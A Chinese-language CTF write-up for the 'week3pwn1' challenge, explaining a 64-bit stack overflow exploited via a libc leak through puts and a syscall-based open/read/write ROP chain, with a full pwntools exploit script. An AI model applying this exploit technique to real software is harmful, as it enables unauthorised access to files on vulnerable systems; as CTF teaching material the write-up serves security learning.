# week3pwn1

## 题目简述

64 位 ELF 存在栈溢出，覆盖偏移为 `0x20` 字节局部缓冲区加 8 字节保存的 `rbp`。程序无 PIE，NX 开启，并提供配套 glibc 2.31。利用分两阶段：先用 ret2puts 泄露 libc，返回 `main`；再调用 libc 中的寄存器控制 gadget 和 `syscall` 完成 `open/read/write`，读取程序内置路径指向的 flag 文件。

## 解题过程

第一阶段的 ROP 为 `puts(puts@got) -> main`。泄漏得到 `puts` 的运行时地址后减去配套 libc 中的符号偏移，避免把 `0x84420` 当成适用于所有 libc 的常量。第二阶段假设 `open` 返回当前进程的下一个文件描述符 3，将内容读入 `.bss` 再写到标准输出。

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
HOST = 'challenge-host'
PORT = 8001
s = remote(HOST, PORT)
elf = ELF('./pwn1')
libc = ELF('./libc-2.31.so')
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = 0x401303
flag_addr = 0x404048
bss_addr = 0x404088
pop_rdi_ret = 0x00000000004013b3
ret = 0x000000000040101a

payload = (
    b'a' * 0x20 + b'b' * 0x8 +
    p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)
)
s.sendlineafter(b'have a try\n', payload)
libc_base = u64(s.recv(6).ljust(8, b'\x00')) - libc.sym['puts']
success('libc_base=>' + hex(libc_base))

syscall_ret = libc_base + 0x00000000000630a9
pop_rax_ret = libc_base + 0x0000000000036174
pop_rsi_ret = libc_base + 0x000000000002601f
pop_rdx_ret = libc_base + 0x0000000000142c92

# read 0
# write 1
# open 2
payload = b'a' * 0x20 + b'b' * 0x8
payload += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(pop_rax_ret) + p64(2) + p64(syscall_ret)
payload += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(bss_addr) + p64(pop_rdx_ret) + p64(0x20) + p64(pop_rax_ret) + p64(0) + p64(syscall_ret)
payload += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(bss_addr) + p64(pop_rdx_ret) + p64(0x20) + p64(pop_rax_ret) + p64(1) + p64(syscall_ret)
s.sendafter(b'have a try\n', payload)
s.interactive()
```

## 方法总结

本题是“ret2libc 泄漏 + syscall ORW”。NX 使栈上代码不可直接执行，但不妨碍复用现有指令；无 PIE 又让主程序的 GOT、PLT、字符串和 `pop rdi` 地址固定。拿到 libc 基址后，ORW 不依赖 `system('/bin/sh')`，在存在 Shell 限制或只需读取文件时更直接。复现时必须使用题目附带的 libc 计算符号偏移，并把旧比赛地址替换为当前实例的主机和端口。
